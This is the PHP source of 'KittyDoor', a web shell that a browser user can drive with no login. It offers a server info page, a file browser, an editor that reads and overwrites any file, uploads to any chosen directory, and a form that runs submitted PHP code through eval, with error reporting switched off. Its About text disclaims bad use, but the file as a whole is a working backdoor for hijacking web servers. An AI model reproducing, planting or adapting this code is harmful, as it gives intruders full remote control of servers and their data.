<?php

class KittyDoor {

    private $output = "";
    private $layout = "";
    private $success = null;
    private $message = "";
    private $request_prefix = "__kd_";
    private $action_param;
    private $server_address = "";
    private $mysql_support = false;
    private $pdo_support = false;
    private $uploadable = false;
    private $readable = false;
    private $writable = false;
    private $dir_listing = false;

    function __construct()
    {
        error_reporting(0);
        @ini_set('display_errors', 0);

        $this->action_param = $this->request_prefix . "action";

        $this->layout = <<<HTML
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
<style>
.{$this->request_prefix} { z-index: 9999 !important }
.{$this->request_prefix} .list-group-item { padding: 4px 6px; }
</style>
</head>
<body class="{$this->request_prefix}">
<nav class="navbar navbar-expand-sm navbar-light bg-light">
  <a class="navbar-brand" href="?{$this->action_param}=home"><span class="fa fa-github-alt"></span> KittyDoor</a>
   <div class="navbar-nav">
      <a class="nav-item nav-link" href="?{$this->action_param}=home">Home</a>
      <a class="nav-item nav-link" href="?{$this->action_param}=files">File Manager</a>
      <a class="nav-item nav-link" href="?{$this->action_param}=upload">Upload</a>
      <a class="nav-item nav-link" href="?{$this->action_param}=eval">PHP Code</a>
      <a class="nav-item nav-link" href="?{$this->action_param}=database">Database</a>
      <a class="nav-item nav-link" href="?{$this->action_param}=about">About</a>
    </div>
</nav>
<div class="p-3">
{{.content}}  
</div>
</body>
</html>
HTML;

        $this->server_address  = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : null;
        $this->server_address  = (! $this->server_address) && isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : $this->server_address;
        $this->server_address .= isset($_SERVER['SERVER_PORT']) ? ":" . $_SERVER['SERVER_PORT'] : "";

        $this->mysql_support = extension_loaded('mysqli') || extension_loaded('mysqli');
        $this->pdo_support = extension_loaded('pdo');
        $this->uploadable = function_exists('move_uploaded_file') || function_exists('copy');
        $this->readable = function_exists('fopen') && function_exists('fread');
        $this->writable = function_exists('fopen') && function_exists('fwrite');
        $this->dir_listing = function_exists('opendir') && function_exists('readdir');

        if (! $this->readable)
            $this->readable = function_exists('file_get_contents');

        if (! $this->writable)
            $this->writable = function_exists('file_put_contents');

        if (! $this->dir_listing)
            $this->dir_listing = function_exists('scandir');

        if (! $this->dir_listing)
            $this->dir_listing = function_exists('glob');

        $action = isset($_GET[$this->action_param]) ? $_GET[$this->action_param] : "";
        switch ($action) {
            case "files":
                $this->_files();
                break;
            case "editor":
                $this->_editor();
                break;
            case "eval":
                $this->_eval();
                break;
            case "upload":
                $this->_upload();
                break;
                break;
            case "about":
                $this->_about();
                break;
            default:
                $this->_home();
        }
    }

    private function _home() {
        $this->output .= '<table class="table table-bordered">';
        $this->output .= '<tr><th colspan="2" class="bg-light text-dark">Server Info</th></tr>';
        $this->output .= '<tr><th style="width: 200px">Operating system</th><td>'. (defined('PHP_OS') ? PHP_OS : '<span class="badge badge-secondary">Unknown</span>') . '</td></tr>';
        $this->output .= '<tr><th>PHP version</th><td>'. (defined('PHP_VERSION') ? PHP_VERSION : '<span class="badge badge-secondary">Unknown</span>') . '</td></tr>';
        $this->output .= '<tr><th>Server address</th><td>'. ($this->server_address ? $this->server_address : '<span class="badge badge-secondary">Unknown</span>') . '</td></tr>';
        $this->output .= '<tr><th>MySQL support</th><td>'. ($this->mysql_support ? '<span class="badge badge-success">Enabled</span>' : '<span class="badge badge-danger">Disabled</span>') . '</td></tr>';
        $this->output .= '<tr><th>PDO support</th><td>'. ($this->pdo_support ? '<span class="badge badge-success">Enabled</span>' : '<span class="badge badge-danger">Disabled</span>') . '</td></tr>';
        $this->output .= '<tr><th>Uploadable</th><td>'. ($this->uploadable ? '<span class="badge badge-success">Enabled</span>' : '<span class="badge badge-danger">Disabled</span>') . '</td></tr>';
        $this->output .= '<tr><th>Readable</th><td>'. ($this->readable ? '<span class="badge badge-success">Enabled</span>' : '<span class="badge badge-danger">Disabled</span>') . '</td></tr>';
        $this->output .= '<tr><th>Writable</th><td>'. ($this->writable ? '<span class="badge badge-success">Enabled</span>' : '<span class="badge badge-danger">Disabled</span>') . '</td></tr>';
        $this->output .= '<tr><th>Directory listing</th><td>'. ($this->dir_listing ? '<span class="badge badge-success">Enabled</span>' : '<span class="badge badge-danger">Disabled</span>') . '</td></tr>';
        $this->output .= '</table>';
    }

    public function _eval() {
        if (isset($_POST[$this->action_param]) && $_POST[$this->action_param] == "eval") {
            $code = isset($_POST[$this->formName('code')]) ? $_POST[$this->formName('code')] : null;

            ob_start();
            @eval($code);
            $_output = ob_get_contents();
            ob_end_clean();

            if ($_output) {
                $this->output .= '<div class="card bg-light text-dark" style="margin-bottom: 20px;"><div class="card-body">'.$_output.'</div></div>';
            }
        }

        $this->output .= '<form action="?'.$this->action_param.'=eval" method="post">';
        $this->output .= '<div class="form-group">
                            <label>PHP Code</label>
                            <textarea class="form-control" rows="5" name="'.$this->formName('code').'" placeholder="echo \'your awesome code\';"></textarea>
                          </div>
                          <button type="submit" class="btn btn-primary" name="'.$this->action_param.'" value="eval">Run</button>';
        $this->output .= '</form>';
    }

    private function _upload() {
        if (! $this->uploadable) {
            $this->output .= '<div class="alert alert-danger">Files can not uploadable on this server.</div>';
            return false;
        }

        if (isset($_POST[$this->action_param]) && $_POST[$this->action_param] == "upload" && isset($_FILES[$this->formName('file')])) {
            $_file = $_FILES[$this->formName('file')];
            $_path = isset($_POST[$this->formName('path')]) && strlen($_POST[$this->formName('path')]) ? realpath($_POST[$this->formName('path')]) : __DIR__;
            $_path = rtrim($_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
            $_name = isset($_POST[$this->formName('filename')]) && strlen($_POST[$this->formName('filename')]) ? $_POST[$this->formName('filename')] : $_file["name"];

            if (! is_dir($_path)) mkdir($_path, 0777, true);
            @chmod($_path, 0755);

            if (function_exists('move_uploaded_file')) {
                @move_uploaded_file($_file["tmp_name"], $_path . $_name);
            }
            elseif (function_exists('copy')) {
                @copy($_file["tmp_name"], $_path . $_name);
            }
        }

        $this->output .= '<form action="?'.$this->action_param.'=upload" method="post" enctype="multipart/form-data">';
        $this->output .= '<div class="form-group">
                            <label>Select a file</label>
                            <input type="file" class="form-control" name="'.$this->formName('file').'" required />
                          </div>
                          <div class="form-group">
                            <label>Directory (optional)</label>
                            <input type="text" class="form-control" name="'.$this->formName('path').'" placeholder="'. __DIR__ .'" />
                          </div>
                          <div class="form-group">
                            <label>Filename (optional)</label>
                            <input type="text" class="form-control" name="'.$this->formName('filename').'" />
                          </div>
                          <button type="submit" class="btn btn-primary" name="'.$this->action_param.'" value="upload">Upload</button>';
        $this->output .= '</form>';
    }

    private function _files() {
        if (! $this->dir_listing) {
            $this->output .= '<div class="alert alert-danger">Directories can not listable on this server.</div>';
            return false;
        }

        $_path = isset($_GET[$this->formName('path')]) && strlen($_GET[$this->formName('path')]) ? realpath(urldecode($_GET[$this->formName('path')])) : __DIR__;

        $this->output .= '<div class="row"><div class="col col-lg-6">';
        $this->output .= '<form action="" method="get">
                          <div class="input-group mb-3">
                            <input type="text" class="form-control" name="'.$this->formName('path').'" value="'.$_path.'">
                              <div class="input-group-prepend">
                              <button type="submit" class="btn btn-primary" name="'.$this->action_param.'" value="files">Go</button>
                            </div>
                          </div>
                          </form>';
        $this->output .= '<div class="list-group">';

        $_files = [];

        if (function_exists('scandir')) {
            $_files = scandir($_path);
        }
        elseif (function_exists('opendir') && function_exists('readdir')) {
            if ($dh = opendir($_path)){
                while (($_file = readdir($dh)) !== false) {
                    if ($_file === '.') continue;
                    $_files[] = $_file;
                }
                closedir($dh);
            }
        }
        elseif (function_exists('glob')) {
            $_tmp = glob($_path . DIRECTORY_SEPARATOR . '*');
            $_files[] = "..";
            foreach ($_tmp as $_file) {
                $_files[] = str_replace($_path . DIRECTORY_SEPARATOR, "", $_file);
            }
        }

        foreach ($_files as $_file) {
            if ($_file === '.') continue;

            $_relative = $_path . DIRECTORY_SEPARATOR . $_file;
            if (is_dir($_relative)) $_module = "files"; elseif (is_file($_relative)) $_module = "editor"; else continue;

            $_url = '?'.$this->action_param.'='.$_module.'&'.$this->formName('path').'='.urlencode($_relative);
            $this->output .= '<a href="'.$_url.'" class="list-group-item list-group-item-action">';
            $this->output .= $_module === "files" ? '<span class="fa fa-folder"></span>' : '<span class="fa fa-file-o"></span>';
            $this->output .= '&nbsp;'.$_file.'</a>';
        }

        $this->output .= '</div>';
        $this->output .= '</div></div>';
    }

    private function _editor() {
        if (! $this->readable) {
            $this->output .= '<div class="alert alert-danger">Files can not writable on this server.</div>';
            return false;
        }

        $_path = isset($_GET[$this->formName('path')]) && strlen($_GET[$this->formName('path')]) ? realpath(urldecode($_GET[$this->formName('path')])) : __DIR__;
        $_content = isset($_POST[$this->formName('source')]) && strlen($_POST[$this->formName('source')]) ? $_POST[$this->formName('source')] : "";
        $_source  = "";

        if (is_file($_path)) {

            if (isset($_POST[$this->action_param]) && $_POST[$this->action_param] == "editor") {
                $_content = str_replace(array("&lt;", "&gt;"), array("<", ">"), $_content);

                if (function_exists('fopen') && function_exists('fread')) {
                    $_f = fopen($_path, "w");
                    fwrite($_f, $_content);
                    fclose($_f);
                } elseif (function_exists('file_put_contents')) {
                    file_put_contents($_path, $_content);
                }
            }

            if (function_exists('fopen') && function_exists('fread')) {
                $_f = fopen($_path, "r");
                while(! feof($_f)) {
                    $_source .= fgets($_f);
                }
                fclose($_f);
            } elseif (function_exists('file_get_contents')) {
                $_source = file_get_contents($_path, $_content);
            }

            $_source = str_replace(array("<", ">"), array("&lt;", "&gt;"), $_source);
            $this->output .= '<form action="?'.$this->action_param.'=editor&'.$this->formName('path').'='.urlencode($_path).'" method="post">';
            $this->output .= '<div class="form-group">
                                <textarea class="form-control" rows="20" name="'.$this->formName('source').'" '.($this->writable ? '' : 'readonly').'>'.$_source.'</textarea>
                              </div>';
            if ($this->writable) $this->output .= '<button type="submit" class="btn btn-primary" name="'.$this->action_param.'" value="editor">Save</button>';
            $this->output .= '</form>';
        }
    }

    private function _about() {
        $this->output .= <<<HTML
KittyDoor is should not be used for bad purposes.
<br/>
<br/>
Source: <a href="https://github.com/bosisler/kittydoor">https://github.com/bosisler/kittydoor</a>
HTML;

    }

    private function formName($name) {
        return $this->request_prefix . $name;
    }

    public function output() {
        echo str_replace("{{.content}}", $this->output, $this->layout);
    }

}

$kd = new KittyDoor();
$kd->output();
